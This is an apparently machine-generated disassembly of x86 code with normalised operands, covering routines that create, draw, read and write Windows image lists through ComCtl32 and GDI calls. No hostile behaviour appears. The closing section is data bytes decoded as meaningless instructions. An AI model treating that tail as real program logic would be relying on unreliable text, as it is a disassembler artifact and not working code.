mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442179
mov eax [ ebp - 0x10 ]
call sub_403164
retn
sub_4421ac
push ebx
mov ebx eax
mov eax ebx
call sub_441e68
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_441fa4
push eax
call ImageList_GetImageCount
pop ebx
retn
sub_4421d0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44224f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4421ac
cmp esi eax
jl r-xdata
mov eax ebx
call sub_441e68
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c20
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b424
call sub_4038d8
mov eax ebx
mov si 0xffef
call sub_403360
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442256
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
push esi
mov eax ebx
call sub_441fa4
push eax
call ImageList_Remove
sub_442268
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_441e68
test al al
je r-xdata
mov [ ebx + 0x44 ] esi
mov eax esi
call sub_441cb8
push eax
mov eax [ ebx + 0x3c ]
push eax
call ImageList_SetBkColor
jmp r-xdata
mov eax ebx
mov si 0xffef
call sub_403360
pop esi
pop ebx
retn
sub_4422a0
push ebx
mov ebx eax
mov eax ebx
call sub_441e68
test al al
je r-xdata
mov eax [ ebx + 0x44 ]
pop ebx
retn
mov eax ebx
call sub_441fa4
push eax
call ImageList_GetBkColor
call sub_441cd8
pop ebx
retn
sub_4422c8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
call sub_441e68
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebx + 0x54 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x48 ]
call sub_441cb8
push eax
mov eax ebx
call sub_4422a0
call sub_441cb8
push eax
push 0x0
push 0x0
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax edi
call sub_4203c0
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_441fa4
push eax
call ImageList_DrawEx
jmp r-xdata
mov eax [ ebx + 0x54 ]
call sub_423080
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_41fcc0
mov eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebx + 0x34 ]
xor edx edx
xor eax eax
call sub_4156e4
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebx + 0x54 ]
call sub_423080
pop edx
call sub_420064
push 0x0
push 0x0
push 0xffffffff
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x54 ]
call sub_423080
call sub_4203c0
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_441fa4
push eax
call ImageList_DrawEx
mov eax [ ebp + 0x10 ]
add eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
add ecx [ ebx + 0x34 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x14 ]
call sub_4156e4
mov eax [ ebx + 0x54 ]
call sub_423080
call sub_4203c0
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x14 ]
mov edx 0xff000014
call sub_41fcc0
mov eax edi
call sub_4203c0
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
inc eax
push eax
mov eax [ ebp + 0x14 ]
inc eax
push eax
push esi
call BitBlt
mov eax [ edi + 0x14 ]
mov edx 0xff000010
call sub_41fcc0
mov eax edi
call sub_4203c0
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push esi
call BitBlt
mov dl 0x1
mov eax [ r-xdata ]
call sub_422ab8
mov esi eax
mov [ ebx + 0x54 ] esi
mov dl 0x1
mov eax esi
call sub_423df0
mov edx [ ebx + 0x34 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebx + 0x30 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
sub_44249c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov bl [ eax + 0x40 ]
push ebx
mov bl [ eax + 0x43 ]
push ebx
mov bl [ ebp + 0x8 ]
push ebx
call sub_4424c0
pop ebx
pop ebp
retn 0xc
sub_4424c0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_441e68
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x14
push edi
mov eax [ ebp + 0x18 ]
push eax
xor eax eax
mov al [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebp + 0xc ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp + 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_44250c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_4156e4
mov eax [ ebp - 0x4 ]
call sub_4431a0
xor eax eax
push ebp
push sub_4426a5
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_422ab8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_442688
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_422ab8
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44266b
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_423df0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x8 ]
push eax
call ImageList_GetImageCount
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442672
mov eax [ ebp - 0x10 ]
call sub_403164
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0xc ]
call sub_423080
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
call sub_420064
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_4203c0
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
call sub_423080
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_420064
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
call sub_4203c0
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4420e0
cmp ebx edi
jne r-xdata
cmp edi 0xffffffff
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_4426b4
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_441fa4
mov edx eax
or ecx 0xffffffff
mov eax ebx
call sub_44250c
sub_4426d4
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov eax ebx
call sub_442008
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4170bc
mov eax ebx
call sub_44225c
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_4428bc
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax esi
call sub_441fa4
mov edx eax
mov eax ebx
call sub_441f40
mov eax ebx
call sub_441e68
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_441fa4
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_441e70
jmp r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_441fa4
push eax
call ImageList_GetBkColor
call sub_441cd8
mov edx eax
mov eax ebx
call sub_442268
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov edx esi
mov eax ebx
call sub_4426b4
jmp r-xdata
sub_442794
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_4171a0
pop esi
pop ebx
retn
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_4428bc
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov eax ebx
call sub_44225c
mov eax esi
call sub_441fa4
mov edx eax
mov eax ebx
call sub_441f40
mov eax ebx
call sub_441e68
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_441fa4
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_441e70
jmp r-xdata
mov eax esi
call sub_441fa4
push eax
call ImageList_GetBkColor
call sub_441cd8
mov edx eax
mov eax ebx
call sub_442268
mov edx esi
mov eax ebx
call sub_4426b4
pop esi
pop ebx
retn
sub_442844
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4428b0
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4428b7
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
cmp eax [ ebx + 0x30 ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c20
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b424
call sub_4038d8
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
cmp eax [ ebx + 0x34 ]
jge r-xdata
sub_4428e4
push ebx
push esi
push edi
push ebp
mov ebx eax
mov [ ebx + 0x58 ] 0x1
cmp [ ebx + 0x5c ] 0x0
jg r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
inc edi
xor ebp ebp
mov edx ebp
mov eax [ ebx + 0x4c ]
call sub_416b18
mov si 0xffff
call sub_403360
inc ebp
dec edi
jne r-xdata
sub_442934
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
xor eax eax
mov [ ebp + 0x4 ] eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_416a08
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_416b18
cmp ebp eax
jne r-xdata
sub_44298c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_407c60
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_4429d0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi edx
mov esi eax
test edi edi
je r-xdata
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov eax esi
call sub_4421ac
mov ebx eax
mov eax edi
call sub_4421ac
cmp ebx eax
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_4421ac
test eax eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_442aac
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_442a8f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_44298c
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442a96
mov eax [ ebp - 0xc ]
call sub_403164
retn
mov eax edi
call sub_4421ac
test eax eax
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
sub_442ac0
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4421ac
test eax eax
setg al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4429d0
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_442b1c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41c830
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
push ebp
call sub_442ac0
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_442b74
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax ebx
call sub_418984
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax ebx
call sub_418984
mov dl 0x1
mov eax [ r-xdata ]
call sub_422ab8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_442df8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_418758
mov esi eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax [ ebp - 0x18 ]
add eax esi
cdq
push edx
push eax
mov eax ebx
call sub_418778
mov dl 0x1
mov eax [ r-xdata ]
call sub_422ab8
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_442ddb
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_422ab8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_422ab8
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_423df0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_4156e4
mov eax [ ebp - 0x4 ]
call sub_4431a0
xor eax eax
push ebp
push sub_442dbe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x30 ]
cdq
idiv ecx
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442dc5
mov eax [ ebp - 0xc ]
call sub_403164
mov eax [ ebp - 0x14 ]
call sub_403164
mov eax [ ebp - 0x4 ]
call sub_4431a4
retn
inc eax
mov [ ebp - 0x20 ] eax
xor edi edi
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x34 ]
cdq
idiv ecx
mov esi eax
dec esi
test esi esi
jl r-xdata
inc edi
dec [ ebp - 0x20 ]
jne r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_41570c
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_423080
push eax
mov eax [ ebp - 0xc ]
call sub_423080
lea edx [ ebp - 0x30 ]
pop ecx
call sub_41ff30
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_41570c
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_423080
push eax
mov eax [ ebp - 0x14 ]
call sub_423080
lea edx [ ebp - 0x30 ]
pop ecx
call sub_41ff30
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4420e0
dec [ ebp - 0x1c ]
inc ebx
dec esi
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_442e08
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cfb0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_442e68
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_441f78
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442e6f
mov eax [ ebp - 0xc ]
call sub_403164
retn
sub eax 0xffffffec
sub_442e6f
mov eax [ ebp - 0x4 ]
call sub_441e68
test al al
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ebx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_442f9e
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_418778
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_418e80
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_418778
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x11 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403164
retn
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_418778
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cfb0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_442f81
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x38
mov eax [ ebp - 0x10 ]
call sub_418778
lea edx [ ebp - 0x12 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_441f78
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403164
retn
sub eax 0xffffffec
mov al [ ebp - 0x12 ]
or [ ebp - 0x11 ] al
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_418778
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
dec eax
sete bl
sub_442fd0
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
call sub_442008
mov eax edi
call sub_418758
mov [ esp + 0xc ] eax
mov edx esp
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
mov bl [ esp ]
and bl 0xff
mov ax [ esp ]
shr ax 0x8
mov [ esp + 0x8 ] al
mov eax [ esp + 0xc ]
cdq
push edx
push eax
mov eax edi
call sub_418778
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx edi
mov eax esi
call sub_442b74
cmp bl 0x49
jne r-xdata
cmp [ esp + 0x8 ] 0x4c
jne r-xdata
mov edx edi
mov eax esi
call sub_442e08
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_44305c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cfb0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_443156
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax r-xdata
call sub_40bcbc
mov [ rw-data ] eax
cmp [ rw-data ] 0x60000
jb r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push r-xdata
call GetModuleHandleA
mov edi eax
test edi edi
je r-xdata
push eax
mov eax ebx
call sub_441fa4
push eax
call ImageList_Write
test eax eax
jne r-xdata
sub eax 0xffffffec
push eax
push 0x1
mov eax ebx
call sub_441fa4
push eax
call [ rw-data ]
test eax eax
je r-xdata
sub eax 0xffffffec
push r-xdata
push edi
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44315d
mov eax [ ebp - 0x4 ]
call sub_403164
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4e0
call sub_4038d8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4e0
call sub_4038d8
jmp r-xdata
sub_4431c4
push ebx
push esi
call sub_4034d8
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403154
test bl bl
jle r-xdata
mov edx esi
call sub_442934
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_443210
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_443235
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44323c
retn
sub_443602
inc ecx
add [ eax + 0x7c004033 ] ah
lds eax [ ecx ]
test al 0x33
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
inc esp
dec ebx
inc esp
add al dl
jae r-xdata
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x300040 ] bh
add [ eax ] al
mov esp 0x58004010
add [ eax ] al
add [ edi ] al
add bh ch
add [ ecx + edx * 2 + 0x44 ] dl
add [ eax + esi * 2 + 0x4f9c0041 ] bh
inc esp
add [ eax + 0x74 ] cl
inc esp
add [ eax ] bl
leave
inc ecx
add [ eax ] dl
0x41
sub_443745
xor al 0x44
add [ eax + eax ] bh
add bh bh
js r-xdata
pop es
inc ebx
popad
jo r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
add eax 0x75411100
je r-xdata
add [ eax ] al
jmp [ eax - 0xfffbb96 ]
imul ebp [ edi + 0x6e ] r-xdata
cmp [ eax ] al
add bh bh
dec esp
push 0x44
add al dl
jb r-xdata
outsb
add [ eax ] dl
inc eax
add [ eax ] bh
add [ eax ] al
dec [ edx + ebp * 2 + 0x44 ]
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
or al 0xe6
inc ecx
add al dl
outsd
inc esp
add [ eax + 0x70 ] ch
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42060006 ] al
imul esi [ ebp + ebp * 2 + 0x61 ] 0x4432a070
add [ eax ] cl
add bh bh
int3
insb
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
inc esp
popa
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
pop es
inc ebx
push 0x656b6365
mov [ fs : esp + eax * 2 ] ds
add [ eax + eax ] bh
[ esp + esi * 2 + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or al [ eax ]
or eax 0x4d627553
outsb
jne r-xdata
js r-xdata
je r-xdata
push esp
adc [ eax ] al
aas
add [ eax ] al
[ eax ]
imul eax [ eax + eax + 0x1 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
or eax 0x72470a00
outsd
